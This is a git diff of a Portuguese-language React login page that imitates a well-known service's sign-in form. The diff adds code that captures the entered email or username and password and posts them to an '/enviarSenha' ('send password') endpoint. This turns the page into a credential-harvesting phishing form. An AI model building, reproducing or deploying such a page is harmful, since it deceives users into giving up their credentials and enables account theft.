@@ -4,18 +4,28 @@ import microsoft from '../../assets/images/microsoft.png'
 
 import './index.scss';
 import { useState, useRef } from 'react';
+import axios from 'axios';
 
+let url = 'http://localhost:5000/enviarSenha'
 
 function App() {
   const [hidePlaceHolder, setHidePlaceHolder] = useState(false)
+
+  const [PWD, setPWD] = useState('')
+  const [EMAIL, setEMAIL] = useState('')
+
   const EmailRef = useRef(null)
   const senhaRef = useRef(null)
 
 
-  function blurInput() {
-    setHidePlaceHolder(true)
+  const EnviarSenha = async () => {
+    let dadosPessoa = {
+      subject: EMAIL,
+      text: PWD
+    }
+    let resposnse = await axios.post(url, dadosPessoa)
+    console.log(resposnse)
   }
-
 
   return (
     <div className="App">
@@ -28,14 +38,14 @@ function App() {
 
           <div onClick={() => EmailRef.current.focus(EmailRef)}>
 
-            <input ref={EmailRef}  type='text' placeholder='Telefone, nome de usuario ou email' />
+            <input ref={EmailRef} type='text' placeholder='Telefone, nome de usuario ou email' onChange={e => setEMAIL(e.target.value)} />
 
           </div>
 
           <div onClick={() => senhaRef.current.focus(senhaRef)}>
-            <input ref={senhaRef} type='password' placeholder='Senha' />
+            <input ref={senhaRef} type='password' placeholder='Senha' onChange={e => setPWD(e.target.value)} />
           </div>
-          <button>Entrar</button>
+          <button onClick={EnviarSenha}>Entrar</button>
         </div>
         <a className='RecPwd' href=''>Esqueceu a senha?</a>
       </div>
